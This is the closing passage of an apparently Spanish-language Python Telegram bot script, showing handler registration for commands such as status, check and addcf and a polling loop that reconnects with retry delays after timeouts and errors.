            app.add_handler(CommandHandler("stop",   cmd_stop))
            app.add_handler(CommandHandler("status", cmd_status))
            app.add_handler(CommandHandler("check",  cmd_check))
            app.add_handler(CommandHandler("debug",  cmd_debug))
            app.add_handler(CommandHandler("addcf",  cmd_addcf))
            app.add_handler(CommandHandler("help",   cmd_help))
            app.add_handler(CallbackQueryHandler(callback_handler))
            app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

            log.info("✅ Bot 🦂LUIS R🦂 listo y corriendo 24/7.")
            attempt = 0
            app.run_polling(drop_pending_updates=True)
            time.sleep(2)

        except requests.exceptions.ReadTimeout:
            delay = RETRY_DELAYS[min(attempt, len(RETRY_DELAYS)-1)]
            log.warning(f"[polling] ReadTimeout → reconectando en {delay}s (intento {attempt+1})")
            time.sleep(delay); attempt += 1

        except requests.exceptions.ConnectionError as e:
            delay = RETRY_DELAYS[min(attempt, len(RETRY_DELAYS)-1)]
            log.warning(f"[polling] ConnectionError: {e} → reconectando en {delay}s")
            time.sleep(delay); attempt += 1

        except KeyboardInterrupt:
            log.info("🔴 Bot detenido manualmente.")
            break

        except Exception as e:
            delay = RETRY_DELAYS[min(attempt, len(RETRY_DELAYS)-1)]
            log.error(f"[polling] Error inesperado: {e}\n{traceback.format_exc()}")
            log.info(f"🔄 Reconectando en {delay}s...")
            time.sleep(delay); attempt += 1

if __name__ == "__main__":
    main()
